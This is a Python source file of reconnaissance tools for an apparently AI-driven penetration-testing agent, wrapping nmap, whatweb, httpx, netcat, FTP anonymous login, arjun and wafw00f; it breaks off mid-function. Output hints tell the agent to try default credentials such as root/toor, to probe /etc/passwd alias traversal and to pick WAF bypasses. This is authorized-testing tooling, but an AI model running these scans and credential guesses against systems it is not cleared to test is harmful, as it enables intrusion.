"""
Active Reconnaissance Tools
Port scanning, service probing, directory brute-force, JS analysis.
"""
from __future__ import annotations

import json
import os
import pathlib
import re
import shutil
import socket
import subprocess
import time
import urllib.parse

import requests

from src.sdk.tool import function_tool
from src.sdk.utils import smart_output
from src.tools.argv import safe_split_options

# Session-level deduplication for expensive directory scans
_ferox_scanned_urls: set = set()
# Session-level deduplication for nmap scans
_nmap_discovered_targets: set = set()  # stores both hostnames and IPs
_nmap_service_scanned: dict = {}  # target -> set of port strings already scanned


def _nmap_resolve(target: str) -> str:
    """Resolve a hostname to its IP for dedup normalisation.
    Returns the IP string if resolution succeeds, else returns target unchanged."""
    import socket as _sock
    try:
        return _sock.gethostbyname(target)
    except Exception:
        return target


@function_tool()
def connectivity_check(target: str, ports: str = "80,443") -> str:
    """
    Verify that a target is reachable before running expensive scans.

    Performs a lightweight TCP connect-scan on common ports and an ICMP ping.
    Should be the FIRST tool called when starting a new engagement so that
    subsequent tools can be gated on reachability.

    Args:
        target: Hostname or IP to probe (e.g. example.com or 10.10.10.1)
        ports:  Comma-separated TCP ports to test (default: 80,443)

    Returns:
        A summary of reachable ports and recommended next steps.
    """
    import socket as _socket

    lines = [f"## Connectivity Check: {target}\n"]
    reachable_ports = []
    unreachable_ports = []

    # ── 1. ICMP ping (non-fatal if blocked) ─────────────────────────────────
    try:
        ping = subprocess.run(
            ["ping", "-c", "3", "-W", "2", target],
            capture_output=True, text=True, timeout=15
        )
        if ping.returncode == 0:
            lines.append("  ✅ ICMP ping: reachable")
        else:
            lines.append("  ⚠️  ICMP ping: no response (may be firewalled — continuing TCP check)")
    except Exception:
        lines.append("  ⚠️  ICMP ping: could not run")

    # ── 2. TCP connect per port ─────────────────────────────────────────────
    port_list = [p.strip() for p in ports.split(",") if p.strip().isdigit()]
    # Also resolve the hostname first — if DNS fails, nothing will work
    try:
        resolved_ip = _socket.gethostbyname(target)
        lines.append(f"  ✅ DNS resolved: {target} → {resolved_ip}")
    except _socket.gaierror:
        resolved_ip = None
        lines.append(f"  ❌ DNS FAILED: cannot resolve '{target}' — check spelling or /etc/hosts")

    for port_str in port_list:
        port = int(port_str)
        try:
            sock = _socket.create_connection((target, port), timeout=5)
            sock.close()
            reachable_ports.append(port)
            lines.append(f"  ✅ TCP {port}: OPEN")
        except (_socket.timeout, ConnectionRefusedError, OSError):
            unreachable_ports.append(port)
            lines.append(f"  ❌ TCP {port}: closed/filtered")

    # ── 3. Verdict ─────────────────────────────────────────────────────────
    lines.append("")
    if reachable_ports:
        lines.append(f"✅ TARGET IS REACHABLE on port(s): {', '.join(map(str, reachable_ports))}")
        lines.append("→ Proceed with nmap_discover(), whatweb_scan(), feroxbuster_scan()")
    elif resolved_ip:
        lines.append("⚠️  TARGET RESOLVED BUT ALL TESTED PORTS CLOSED/FILTERED")
        lines.append("   Possible causes: firewall, WAF, CDN, VPN not connected")
        lines.append("→ Try: nmap_discover() with -Pn to confirm whether other ports are open")
        lines.append("→ If behind Cloudflare/CDN, real IP may differ — use cloudflair_scan()")
    else:
        lines.append("❌ TARGET IS UNREACHABLE — DNS resolution failed")
        lines.append("   Do NOT proceed with scanning tools; they will produce false results")
        lines.append("→ Verify hostname spelling, check VPN/network, confirm /etc/hosts if needed")

    return "\n".join(lines)


@function_tool()
def nmap_scan(target: str, scan_type: str = "-sV") -> str:
    """
    Run Nmap port scan on a target.

    ⚡ PREFERRED WORKFLOW — use these two tools in sequence instead:
       1. nmap_discover(target)          ← fast full-port sweep (~30 sec)
       2. nmap_service_scan(target, ports) ← deep scan on open ports only

    This tool is kept for targeted quick scans (e.g. specific ports).

    Args:
        target: IP address or hostname to scan
        scan_type: Nmap scan flags (e.g., '-sV -p 80,443,22')
                   Do NOT use '-p- --script' together — it always times out.

    Returns:
        Nmap scan results showing open ports, services, and versions
    """
    # Safety guard: never run -p- with --script in the same scan
    _flags = scan_type.lower()
    if "-p-" in _flags and ("--script" in _flags or "-sc" in _flags):
        return (
            "⚠️ SCAN ABORTED: '-p- --script' combination always times out.\n"
            "Use the 2-phase approach:\n"
            "  Step 1: nmap_discover(target)              ← fast, finds all open ports\n"
            "  Step 2: nmap_service_scan(target, ports)   ← deep on open ports only\n"
        )
    scan_args, scan_error = safe_split_options(scan_type, "scan_type")
    if scan_error:
        return scan_error

    try:
        cmd = ["nmap"] + scan_args + [target]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"No results returned for {target}"
        if len(output) < 100:
            return f"Scan completed but returned minimal output. Command: nmap {scan_type} {target}\nOutput: {output}"
        raw = f"## Nmap Results: {target}\n\n{output}"
        return smart_output(raw, "nmap_scan", f"{target}_{scan_type}")
    except FileNotFoundError:
        return "Error: nmap not found. Install with: sudo apt install nmap"
    except subprocess.TimeoutExpired:
        return (
            f"Error: Nmap scan timed out after 20 minutes. Target: {target}\n"
            "Use nmap_discover() + nmap_service_scan() for full-port scans."
        )
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def nmap_discover(target: str) -> str:
    """
    PHASE 1 — Fast full-port discovery scan.

    Sweeps ALL 65535 TCP ports at high speed using SYN packets.
    Typically completes in 30-120 seconds on a LAN/VPN target.
    Always run this FIRST before nmap_service_scan.

    Use the open ports from this output as input to nmap_service_scan().

    Args:
        target: IP address or hostname to scan

    Returns:
        List of open TCP ports discovered
    """
    # Normalise hostname → IP so that 'example.com' and '1.2.3.4' don't
    # both trigger a full-port scan when they resolve to the same host.
    _resolved = _nmap_resolve(target)

    # ── Persistent dedup: reuse recent profile ports across delegated agents ──
    # Tool-level globals can be reset depending on how sub-agents are executed.
    # The target profile persists and is safer for avoiding redundant scans.
    try:
        from datetime import datetime, timezone
        from src.repl.profiles import get_profile_manager

        _pm = get_profile_manager()
        _prof = _pm.load_profile(target)
        _has_ports = bool(_prof.ports)
        _recent = False
        try:
            _dt = datetime.fromisoformat((_prof.updated_at or "").replace("Z", "+00:00"))
            if _dt.tzinfo is None:
                _dt = _dt.replace(tzinfo=timezone.utc)
            _recent = (datetime.now(timezone.utc) - _dt).total_seconds() < 60 * 60  # 60 min
        except Exception:
            _recent = False

        if _has_ports and _recent:
            _ports_csv = ",".join(str(p.get("port")) for p in _prof.ports if p.get("port"))
            return (
                f"[SKIPPED] Existing open ports already recorded for {target}: `{_ports_csv}`\n"
                "Reason: profile was updated recently; re-running is usually redundant.\n"
                "To force a rescan, use nmap_scan(target, '-p- --open -T4 -Pn -n')."
            )
    except Exception:
        pass

    # ── Session dedup: skip if already discovered this session ───────────────
    if target in _nmap_discovered_targets or _resolved in _nmap_discovered_targets:
        return (
            f"[SKIPPED] nmap_discover already ran on {target} (resolved: {_resolved}) this session.\n"
            "Use the open ports from the earlier result — re-running returns identical output."
        )
    try:
        cmd = [
            "nmap",
            "-p-",           # all 65535 ports
            "--open",         # only show open ports
            "-T4",            # aggressive timing
            "--min-rate=1000",# send at least 1000 packets/sec
            "-n",             # no DNS resolution
            "-Pn",            # skip host discovery (assume up)
            target,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"No results returned for {target}"

        # Extract open ports for easy parsing
        open_ports = re.findall(r"(\d+)/tcp\s+open", output)
        ports_csv = ",".join(open_ports)

        # Persist discovery into target profile so delegated agents can reuse it
        try:
            from src.repl.profiles import get_profile_manager

            _pm = get_profile_manager()
            if _resolved and _resolved != target:
                _pm.add_ip_address(target, _resolved)
            # Record at least the open ports even if service is unknown yet
            for _p in open_ports:
                try:
                    _pm.add_port(target, int(_p), protocol="tcp")
                except Exception:
                    pass
        except Exception:
            pass

        summary = f"## Nmap Discovery: {target}\n\n"
        summary += f"### Open Ports Found: {len(open_ports)}\n"
        if open_ports:
            summary += f"**Port list (ready for nmap_service_scan):** `{ports_csv}`\n\n"
            summary += "**NEXT STEP:** Run `nmap_service_scan` with these ports:\n"
            summary += f"  `nmap_service_scan('{target}', '{ports_csv}')`\n\n"
        else:
            summary += "No open TCP ports found.\n\n"
        summary += "### Full Output:\n" + output
        # Register both the original handle and the resolved IP so either form is deduped
        _nmap_discovered_targets.add(target)
        _nmap_discovered_targets.add(_resolved)
        return smart_output(summary, "nmap_discover", target)
    except FileNotFoundError:
        return "Error: nmap not found. Install with: sudo apt install nmap"
    except subprocess.TimeoutExpired:
        return (
            f"Error: Discovery scan timed out after 10 minutes. Target: {target}\n"
            "Try a narrowed range: nmap_scan(target, '-p 1-10000 --open -T4')"
        )
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def nmap_service_scan(target: str, ports: str) -> str:
    """
    PHASE 2 — Deep service/version/script scan on specific open ports.

    Run this AFTER nmap_discover() with only the ports it found open.
    Runs: -sV (service version), -sC (default scripts), -O (OS detection).
    Much faster than scanning all ports because it targets only open ones.

    Args:
        target: IP address or hostname to scan
        ports:  Comma-separated port list from nmap_discover output
                e.g. "22,80,443,54321"

    Returns:
        Detailed service versions, banners, scripts, and OS fingerprint
    """
    if not ports.strip():
        return "Error: ports cannot be empty. Run nmap_discover() first to find open ports."

    # Sanitize ports input — only digits and commas
    ports_clean = re.sub(r"[^\d,\-]", "", ports.strip()).strip(",")
    if not ports_clean:
        return f"Error: '{ports}' does not look like a valid port list (e.g. '22,80,443')."

    # Normalised requested port set (strings) for dedup checks
    _requested_ports = frozenset(p.strip() for p in ports_clean.split(",") if p.strip())

    # ── Persistent dedup: if services for these ports already stored recently ─
    try:
        from datetime import datetime, timezone
        from src.repl.profiles import get_profile_manager

        _pm = get_profile_manager()
        _prof = _pm.load_profile(target)
        _recent = False
        try:
            _dt = datetime.fromisoformat((_prof.updated_at or "").replace("Z", "+00:00"))
            if _dt.tzinfo is None:
                _dt = _dt.replace(tzinfo=timezone.utc)
            _recent = (datetime.now(timezone.utc) - _dt).total_seconds() < 60 * 60
        except Exception:
            _recent = False

        if _recent and _prof.ports:
            # Check if we have service/version info for the requested ports
            _ports_with_info = {str(p.get("port")) for p in _prof.ports if p.get("service") or p.get("version")}
            if _requested_ports and _requested_ports.issubset(_ports_with_info):
                return (
                    f"[SKIPPED] Existing service/port data already recorded for {target} ports {ports_clean}.\n"
                    "Reason: profile was updated recently; re-running is usually redundant.\n"
                    "To force a rescan, use nmap_scan(target, f'-sV -sC -O -p {ports_clean} -Pn')."
                )
    except Exception:
        pass

    # ── Session dedup: skip if all requested ports already scanned this session ─
    _already_scanned = _nmap_service_scanned.get(target, set())
    if _requested_ports and _requested_ports.issubset(_already_scanned):
        return (
            f"[SKIPPED] nmap_service_scan already ran on {target} for ports {ports_clean} this session.\n"
            "Use the existing service scan results — re-running returns identical output."
        )

    try:
        cmd = [
            "nmap",
            "-sV",           # service version detection
            "-sC",           # default safe scripts
            "-O",            # OS fingerprint
            "--version-intensity=7",  # thorough version detection
            "-p", ports_clean,
            "-Pn",           # assume host is up
            target,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"No results returned for {target}:{ports_clean}"

        # Flag interesting services immediately
        interesting = []
        _out_low = output.lower()
        if "minio" in _out_low or "x-amz" in _out_low:
            interesting.append("⚠️  MinIO/S3 detected! Check port 9001 for console. Try: minioadmin/minioadmin")
        if "redirect" in _out_low and (".htb" in _out_low or ".local" in _out_low or ".thm" in _out_low):
            _vhost_match = re.search(r'([\w\-]+\.(htb|local|thm|internal|corp|lab))', output, re.IGNORECASE)
            if _vhost_match:
                interesting.append(f"⚠️  Virtual host redirect detected: {_vhost_match.group(1)}")
                interesting.append(f"   Run: add_hosts_entry('<ip>', '{_vhost_match.group(1)}')")
        if "openssh" in _out_low:
            _ssh_ver = re.search(r"OpenSSH ([\d.]+)", output, re.IGNORECASE)
            if _ssh_ver:
                interesting.append(f"ℹ️  SSH version: OpenSSH {_ssh_ver.group(1)}")
        if "http" in _out_low:
            interesting.append("ℹ️  HTTP service found — available follow-up tools (only if user requests web enumeration): whatweb_scan(), feroxbuster_scan()")

        # ── cPanel / WHM detection ────────────────────────────────────────────
        # Port 2082 = cPanel HTTP, 2083 = cPanel HTTPS, 2086 = WHM HTTP, 2087 = WHM HTTPS
        _cpanel_ports = re.findall(r'\b(2082|2083|2086|2087)\b', ports_clean)
        if _cpanel_ports or "cpanel" in _out_low or "whostmgr" in _out_low:
            interesting.append("🔴  cPanel/WHM detected!")
            for _cp in sorted(set(_cpanel_ports)):
                _proto = "https" if _cp in ("2083", "2087") else "http"
                _panel = "WHM (root)" if _cp in ("2086", "2087") else "cPanel"
                interesting.append(f"   Port {_cp} → {_panel}: {_proto}://{target}:{_cp}/")
            interesting.append("   → Test default creds: admin/admin, root/toor, admin/password")
            interesting.append("   → Run nuclei -t cves/ -u http://" + target + ":2082/")
            interesting.append("   → Check CVE-2020-27641, CVE-2021-38199 (cPanel RCE/privesc)")

        # ── MikroTik RouterOS detection ───────────────────────────────────────
        if "mikrotik" in _out_low or "routeros" in _out_low:
            _mt_port_m = re.search(r'(\d+)/tcp.*mikrotik', output, re.IGNORECASE)
            _mt_port = _mt_port_m.group(1) if _mt_port_m else "?"
            interesting.append(f"🔴  MikroTik RouterOS detected on port {_mt_port}!")
            interesting.append("   → Default credentials: username=admin, password=(empty string)")
            interesting.append(f"   → Try: ssh -p {_mt_port} admin@{target}  (blank password)")
            interesting.append("   → Known CVEs: CVE-2018-14847 (Winbox credential leak, CVSS 9.1)")
            interesting.append("   → Run: searchsploit MikroTik")

        # ── Nginx / OpenResty misconfiguration hints ──────────────────────────
        if "openresty" in _out_low or ("nginx" in _out_low and ("52224" in ports_clean or "52229" in ports_clean or "52232" in ports_clean)):
            interesting.append("ℹ️  OpenResty/Nginx on non-standard port(s) — test for:")
            interesting.append("   → Alias traversal: /static../etc/passwd")
            interesting.append("   → Merge-slashes misconfiguration")
            interesting.append("   → Run nuclei -t http/technologies/nginx* -t http/vulnerabilities/nginx*")

        out_str = f"## Nmap Service Scan: {target} (ports: {ports_clean})\n\n"
        if interesting:
            out_str += "### 🔍 Notable Findings:\n"
            for item in interesting:
                out_str += f"  {item}\n"
            out_str += "\n"
        out_str += "### Full Output:\n" + output

        # Persist parsed services into target profile + attack planner
        try:
            from src.repl.profiles import get_profile_manager
            from src.sdk.attack_planner import get_attack_planner

            _pm = get_profile_manager()
            _planner = get_attack_planner()
            # Nmap output table lines look like: '80/tcp open http Apache httpd 2.4.57'
            for _line in output.splitlines():
                _m = re.match(r"^(\d+)/tcp\s+open\s+(\S+)\s*(.*)$", _line.strip())
                if not _m:
                    continue
                _port = int(_m.group(1))
                _svc = _m.group(2)
                _ver = (_m.group(3) or "").strip()
                try:
                    _pm.add_port(target, _port, protocol="tcp", service=_svc, version=_ver)
                except Exception:
                    pass
                try:
                    _planner.add_service(_port, _svc, _ver)
                except Exception:
                    pass
            try:
                _planner.detect_target_profile()
            except Exception:
                pass
        except Exception:
            pass

        # Track scanned ports for dedup
        if target not in _nmap_service_scanned:
            _nmap_service_scanned[target] = set()
        _nmap_service_scanned[target].update(_requested_ports)
        return smart_output(out_str, "nmap_service_scan", f"{target}_p{ports_clean}")
    except FileNotFoundError:
        return "Error: nmap not found. Install with: sudo apt install nmap"
    except subprocess.TimeoutExpired:
        return (
            f"Error: Service scan timed out after 10 minutes.\n"
            f"Target: {target}, Ports: {ports_clean}\n"
            "Try removing -O flag: nmap_scan(target, f'-sV -sC -p {ports_clean}')"
        )
    except Exception as e:
        return f"Error: {e}"




def _get_httpx_binary() -> str | None:
    """Return the name of the ProjectDiscovery httpx binary if available."""
    # In Kali, it's often installed as httpx-toolkit to avoid python-httpx conflict
    for binary in ("httpx-toolkit", "httpx"):
        saw_projectdiscovery = False
        try:
            result = subprocess.run(
                [binary, "-version"], capture_output=True, text=True, timeout=10
            )
            output = (result.stdout + result.stderr).lower()
            if "projectdiscovery" in output or "pdteam" in output:
                saw_projectdiscovery = True
        except Exception:
            pass
            
        try:
            result = subprocess.run(
                [binary, "--help"], capture_output=True, text=True, timeout=10
            )
            output = (result.stdout + result.stderr).lower()
            if "status-code" in output and "tech-detect" in output and "🦋" not in output:
                saw_projectdiscovery = True
        except Exception:
            pass

        if saw_projectdiscovery:
            import tempfile
            tmp_name = ""
            try:
                with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
                    tmp.write("")
                    tmp_name = tmp.name
                result = subprocess.run(
                    [binary, "-l", tmp_name, "-silent"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                output = (result.stdout + result.stderr).lower()
                if "no such option" not in output and "unknown shorthand" not in output:
                    return binary
            except Exception:
                pass
            finally:
                if tmp_name and os.path.exists(tmp_name):
                    try:
                        os.remove(tmp_name)
                    except Exception:
                        pass
             
    return None


@function_tool()
def httpx_probe(targets: str, options: str = "-status-code -tech-detect -title") -> str:
    """
    Fast HTTP probing with technology detection using ProjectDiscovery httpx.

    Args:
        targets: Target URL(s) or file path with targets
        options: httpx flags (e.g., '-status-code -tech-detect -title')

    Returns:
        HTTP probe results with status codes, technologies, and titles
    """
    httpx_bin = _get_httpx_binary()
    if not httpx_bin:
        return (
            "Error: ProjectDiscovery httpx (Go binary) not found or wrong version on PATH.\n"
            "The Python 'httpx' pip package is installed but that is NOT a security tool.\n"
            "Install the correct binary or ensure it appears before Python httpx on PATH:\n"
            "  go install github.com/projectdiscovery/httpx/cmd/httpx@latest\n"
            "  export PATH=$HOME/go/bin:$PATH"
        )
    try:
        tmp_file = None
        if "\n" in targets or "," in targets or " " in targets.strip():
            import tempfile
            import re
            tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            normalized_targets = "\n".join(
                t.strip()
                for t in re.split(r"[\s,]+", targets.strip())
                if t.strip()
            )
            tmp.write(normalized_targets)
            tmp.close()
            tmp_file = tmp.name
            cmd = [httpx_bin] + options.split() + ["-l", tmp_file]
        elif targets.endswith(".txt"):
            if not os.path.isfile(targets):
                return f"Error: Target file not found: {targets}"
            cmd = [httpx_bin] + options.split() + ["-l", targets]
        else:
            cmd = [httpx_bin] + options.split() + ["-u", targets]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout.strip() or result.stderr.strip()

        if tmp_file and os.path.exists(tmp_file):
            try:
                os.remove(tmp_file)
            except Exception:
                pass

        if not output:
            return "No results"
        if "No such option" in output:
            return (
                f"Error: Invalid ProjectDiscovery httpx option or wrong httpx binary on PATH.\n"
                f"Binary: {httpx_bin}\n"
                f"Options: {options}\n"
                f"Output: {output}"
            )
        raw = f"## httpx Probe Results\n\n{output}"
        return smart_output(raw, "httpx_probe", targets)
    except FileNotFoundError:
        return "Error: httpx not found. Install: go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
    except subprocess.TimeoutExpired:
        return "Error: httpx timed out after 120 seconds"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def whatweb_scan(target: str, aggression: int = 1) -> str:
    """
    Website fingerprinting - identify CMS, frameworks, server software.

    Args:
        target: Target URL or IP
        aggression: Aggression level — use 1 (passive/stealth) or 3 (aggressive).
                    Level 2 is invalid in whatweb; any even value is coerced upward.

    Returns:
        Detected technologies and frameworks
    """
    _static_exts = ('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf')
    if any(target.lower().split('?')[0].endswith(ext) for ext in _static_exts):
        return "[whatweb_scan] REJECTED: Refusing to fingerprint a static asset. WhatWeb should be aimed at directories or applications, not individual CSS/JS files."
    # whatweb only accepts 1, 3, or 4 — coerce invalid values
    _valid = (1, 3, 4)
    if aggression not in _valid:
        # Pick nearest valid level
        aggression = min(_valid, key=lambda v: abs(v - aggression))
    try:
        result = subprocess.run(
            ["whatweb", f"--aggression={aggression}", target],
            capture_output=True, text=True, timeout=300
        )
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return "No results"

        # Auto-detect redirect-to-hostname patterns and advise on /etc/hosts
        _hosts_hint = ""
        _redirect_match = re.search(
            r'RedirectLocation\[([^\]]+)\]|Location:[\s]+([^\s]+)',
            output, re.IGNORECASE
        )
        if not _redirect_match:
            # Also check for anything that looks like a .htb / .local / .internal redirect
            _redirect_match = re.search(
                r'http[s]?://([a-z0-9\-]+\.(htb|local|internal|corp|lab|home|box|thm))',
                output, re.IGNORECASE
            )
        if _redirect_match:
            _found_hostname = _redirect_match.group(1) or _redirect_match.group(2) or ""
            # Strip scheme if present
            _found_hostname = re.sub(r'^https?://', '', _found_hostname).split('/')[0].strip()
            if _found_hostname:
                import socket as _sock
                try:
                    _sock.gethostbyname(_found_hostname)
                except _sock.gaierror:
                    # Extract target IP from original target
                    _target_ip = ""
                    _ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', target)
                    if _ip_match:
                        _target_ip = _ip_match.group(1)
                    else:
                        try:
                            from src.sdk.context_hub import get_context_hub as _gch
                            _ct = _gch().current_target or ""
                            if re.match(r'^\d+\.\d+\.\d+\.\d+$', _ct):
                                _target_ip = _ct
                        except Exception:
                            pass
                    if _target_ip:
                        _hosts_hint = (
                            f"\n\n⚠️ ACTION REQUIRED — Virtual Host Detected!\n"
                            f"'{_found_hostname}' redirects here but is NOT in DNS.\n"
                            f"Run this tool IMMEDIATELY before any other scan:\n"
                            f"  add_hosts_entry('{_target_ip}', '{_found_hostname}')\n"
                            f"Without this step, curl, gobuster, feroxbuster, arjun, "
                            f"gau and all other tools will return 'No response received'."
                        )

        # Persist basic technology fingerprint into target profile
        try:
            from src.repl.profiles import get_profile_manager
            _pm = get_profile_manager()
            try:
                _host = urllib.parse.urlparse(target).hostname
            except Exception:
                _host = None
            _profile_key = _host or target

            # WhatWeb output is usually one line: '<url> [status] Tech1, Tech2, Key[Val]'
            _line0 = output.splitlines()[0] if output.splitlines() else output
            _parts = _line0.split("]", 1)
            _tech_blob = _parts[1] if len(_parts) > 1 else ""
            _tokens = [t.strip() for t in _tech_blob.split(",") if t.strip()]
            for _tok in _tokens[:25]:
                # Keep tokens reasonably small to avoid junk
                if len(_tok) <= 80:
                    _pm.add_web_technology(_profile_key, _tok)
        except Exception:
            pass

        # ── WordPress detection → mandatory WPScan hint ───────────────────
        _wp_hint = ""
        _out_lower = output.lower()
        if any(wp_sig in _out_lower for wp_sig in [
            "wordpress", "wp-content", "wp-json", "wp-admin",
            "wp-includes", "x-powered-by: wp", "theme-flavor[wordpress"
        ]):
            _wp_hint = (
                "\n\n🔴 **MANDATORY ACTION: WordPress Detected!**\n"
                "   You MUST run `wpscan` on this target BEFORE any manual testing.\n"
                "   Command: `wpscan(target, '--enumerate ap,at,cb,dbe --plugins-detection aggressive')`\n"
                "   WPScan identifies plugins, themes, versions, and their CVEs in one pass.\n"
                "   NEVER manually probe /wp-content/plugins/ — WPScan is 100x more efficient."
            )

        # ── Versioned software → CVE lookup hint ──────────────────────────
        _cve_hint = ""
        _version_matches = re.findall(
            r'([\w./-]+)\[([\d]+(?:\.\d+)+(?:\.\d+)?)\]', output
        )
        if _version_matches:
            _sw_versions = [f"{sw} {ver}" for sw, ver in _version_matches[:5]]
            _cve_hint = (
                f"\n\nℹ️  **Versioned software detected — CVE lookup recommended:**\n"
                f"   {', '.join(_sw_versions)}\n"
                f"   Run: `cve_lookup(software, version)` for each to check for known CVEs."
            )

        return f"## WhatWeb Results: {target}\n\n{output}{_hosts_hint}{_wp_hint}{_cve_hint}"
    except FileNotFoundError:
        return "Error: whatweb not found. Install with: sudo apt install whatweb"
    except subprocess.TimeoutExpired:
        return "Error: WhatWeb timed out after 5 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def nc_connect(host: str, port: int, data: str = "", options: str = "-v") -> str:
    """
    Connect to a host/port using netcat (nc). Useful for banner grabbing,
    port checking, and sending raw data to services.

    Args:
        host: Target hostname or IP
        port: Target port number
        data: Optional data to send
        options: Additional nc options

    Returns:
        Connection output / banner
    """
    try:
        cmd = ["nc"] + options.split() + ["-w", "5", host, str(port)]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,
            input=data if data else None,
        )
        output = (result.stdout + result.stderr).strip()
        if not output:
            return f"Connection to {host}:{port} completed (no output)"
        return f"## NC Results: {host}:{port}\n\n{output}"
    except FileNotFoundError:
        return "Error: nc (netcat) not found. Install with: sudo apt install netcat"
    except subprocess.TimeoutExpired:
        return f"Connection to {host}:{port} timed out after 30 seconds"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def nc_scan(host: str, ports: str, options: str = "-zv -w2") -> str:
    """
    Quick port scan using netcat. Faster than nmap for simple port checks.

    Args:
        host: Target host IP or hostname
        ports: Port or port range (e.g., '80', '1-1024', '22,80,443')

    Returns:
        Open ports from netcat scan
    """
    try:
        cmd = ["nc"] + options.split() + [host, ports]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        stderr = result.stderr.strip()
        output = result.stdout.strip()
        combined = stderr or output
        return f"Scan of {host}:{ports} completed\n{combined}"
    except FileNotFoundError:
        return "Error: nc (netcat) not found. Install with: sudo apt install netcat"
    except subprocess.TimeoutExpired:
        return f"Port scan of {host}:{ports} timed out"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def telnet_connect(host: str, port: int = 23, timeout: int = 10) -> str:
    """
    Connect to a service using telnet. Useful for banner grabbing and
    testing text-based protocols (SMTP, POP3, IMAP, HTTP/1.0).

    Args:
        host: Target hostname or IP
        port: Target port (default 23 for telnet)
        timeout: Connection timeout in seconds

    Returns:
        Connection banner and initial response
    """
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            try:
                data = sock.recv(4096)
                banner = data.decode("utf-8", errors="replace").strip()
            except Exception:
                banner = ""
        if banner:
            return f"Connected to {host}:{port}\n\nBanner:\n{banner}"
        return f"Connected to {host}:{port} (no banner received)"
    except socket.timeout:
        return f"Connection to {host}:{port} timed out after {timeout} seconds"
    except ConnectionRefusedError:
        return f"Connection to {host}:{port} refused"
    except Exception as e:
        return f"Error connecting to {host}:{port}: {e}"


@function_tool()
def ftp_anonymous_enum(host: str, port: int = 21, timeout: int = 15) -> str:
    """
    Test FTP for anonymous login, banner grabbing, and retrieve directory listing.
    Handles passive mode and data channels automatically via Python's ftplib.

    Args:
        host: Target hostname or IP
        port: Target FTP port (default 21)
        timeout: Connection timeout in seconds

    Returns:
        FTP banner, login status, and directory listing if accessible
    """
    import ftplib
    lines = [f"## FTP Enumeration: {host}:{port}\n"]
    ftp = ftplib.FTP()
    try:
        banner = ftp.connect(host, port, timeout=timeout)
        lines.append(f"Banner: {banner}")
        
        try:
            login_resp = ftp.login(user="anonymous", passwd="anonymous@example.com")
            lines.append(f"Login: SUCCESS ({login_resp})")
            
            try:
                syst = ftp.sendcmd("SYST")
                lines.append(f"System: {syst}")
            except Exception:
                pass

            lines.append("\nDirectory Listing:")
            try:
                dir_list = []
                ftp.retrlines("LIST", dir_list.append)
                if not dir_list:
                    lines.append("  (Empty directory)")
                else:
                    for d in dir_list:
                        lines.append(f"  {d}")
            except Exception as e:
                lines.append(f"  Failed to retrieve directory listing: {e}")
                
        except ftplib.error_perm as e:
            lines.append(f"Login: FAILED (Anonymous access denied) - {e}")
            
    except Exception as e:
        lines.append(f"Connection Error: {e}")
    finally:
        try:
            ftp.quit()
        except Exception:
            try:
                ftp.close()
            except Exception:
                pass
                
    return "\\n".join(lines)


@function_tool()
def arjun_params(url: str, method: str = "GET", options: str = "") -> str:
    """
    Discover hidden HTTP parameters using Arjun.

    Args:
        url: Target URL
        method: HTTP method to use (GET or POST)
        options: Additional arjun options

    Returns:
        Discovered hidden parameters
    """
    try:
        cmd = ["arjun", "-u", url, "-m", method] + (options.split() if options else [])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"Arjun found no parameters for {url}"
        raw = f"## Arjun Parameter Discovery: {url}\n\n{output}"
        return smart_output(raw, "arjun_params", url)
    except FileNotFoundError:
        return "arjun not found. Install with: pip install arjun"
    except subprocess.TimeoutExpired:
        return f"Arjun timed out scanning {url} after 20 minutes"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def wafw00f_detect(target: str, options: str = "-a", confirm: bool = False, retries: int = 1) -> str:
    """
    Detect Web Application Firewalls (WAF) using wafw00f.
    Identifies which WAF is protecting a website so you can choose bypass techniques.

    Args:
        target: Target URL or domain
        options: Additional wafw00f options (-a for all WAFs)

    Returns:
        Detected WAF information
    """
    try:
        attempts = max(1, min(int(retries), 3))
        outputs = []
        for _ in range(attempts):
            cmd = ["wafw00f", target] + options.split()
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout.strip() or result.stderr.strip()
            if output:
                outputs.append(output)

        if not outputs:
            return "No WAF detected or wafw00f returned no output"

        out = f"## WAF Detection: {target}\n\n" + "\n\n".join(outputs)
        out += "\n\nNote: wafw00f is best-effort; false positives/negatives are common."

        if confirm:
            try:
                from src.tools.appsec.common import _get_evasion_headers
                import uuid as _uuid
                headers = _get_evasion_headers()
                base_r = requests.get(target, headers=headers, timeout=10, verify=False, allow_redirects=False)
                probe_url = target.rstrip("/") + f"/.waf-probe-{_uuid.uuid4().hex[:8]}"
                probe_r = requests.get(probe_url, headers=headers, timeout=10, verify=False, allow_redirects=False)
                if probe_r.status_code in (403, 406, 429) and base_r.status_code not in (403, 406, 429):
                    out += "\n\nBehavioral signal: probe path returned a blocking status (403/406/429)."
            except Exception:
                pass

        return out
    except FileNotFoundError:
        return "Error: wafw00f not found. Install with: pip install wafw00f"
    except subprocess.TimeoutExpired:
        return "Error: wafw00f timed out after 60 seconds"
    except Exception as e:
